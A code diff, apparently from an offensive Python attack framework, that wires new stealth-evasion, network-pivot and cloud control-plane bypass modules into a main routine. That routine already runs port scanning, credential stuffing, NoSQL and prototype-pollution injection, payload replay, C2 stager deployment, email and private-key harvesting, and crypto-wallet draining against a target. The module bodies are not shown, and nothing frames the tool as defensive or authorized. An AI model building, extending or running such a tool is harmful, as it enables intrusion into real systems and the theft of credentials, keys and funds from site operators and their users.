@@ -6,15 +6,19 @@ import socket
 import threading
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
-from modules.scanner import run_port_scanner             # <--- New Recon Module
+from modules.scanner import run_port_scanner
 from modules.engine import run_autonomous_engine
-from modules.no_sql_prototype import test_nosql_and_pollution # <--- New Exploitation Module
+from modules.no_sql_prototype import test_nosql_and_pollution
 from modules.replayer import replay_and_inject_payloads
-from modules.dumper import harvest_email_intelligence     # <--- Upgraded Vault/Email Dumper
+from modules.dumper import harvest_email_intelligence
 from modules.mail import send_breach_alert
 from modules.payloads import deploy_c2_stager
 from modules.keyharvester import harvest_private_keys
 from modules.drainer import check_and_drain_wallet
+# --- Newly Integrated Advanced Modules ---
+from modules.stealth_ops import run_stealth_engine
+from modules.pivot import run_pivot_engine
+from modules.cloud_apex import run_cloud_apex_suite
 
 # Cyberpunk Neon & Clean Structured Palette
 CYAN = "\033[96m"
@@ -136,6 +140,13 @@ async def async_main():
     except Exception as e:
         print(f"       └── [!] Notice during DOM parse: {e}")
 
+    # Step 2.5: Behavioral Evasion & Stealth Jitter Wrapper
+    print(f"\n{CYAN}[RECON 3/3] → Engaging Stealth Telemetry & Behavioral Jitter{RESET}")
+    try:
+        await run_stealth_engine(target, paths_to_probe=["/", "/login", "/api/health"])
+    except Exception as e:
+        print(f"       └── [!] Notice during stealth probing: {e}")
+
     # Step 3: Launch Heavy Autonomous Engine (Stateful Differential Analysis & Credential Stuffing)
     hits, duration = await run_autonomous_engine(target, passwords)
 
@@ -150,6 +161,14 @@ async def async_main():
     if not hits:
         cyber_print(f"{YELLOW}[*] Deploying adaptive neural payload replaying...{RESET}", 0.005)
         await replay_and_inject_payloads(target)
+
+    # Step 4.5: Post-Exploitation Pivot & Cloud Control-Plane Bypass Suite
+    print(f"\n{CYAN}[PIVOT] → Initializing Autonomous Post-Exploitation & Cloud Control-Plane Suite{RESET}")
+    try:
+        await run_pivot_engine(target)
+        await run_cloud_apex_suite(target)
+    except Exception as e:
+        print(f"       └── [!] Notice during pivot execution: {e}")
 
     # Step 5: Post-Exploitation, Vault Scraping, Crypto Wallet & Asset Auditing
     cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
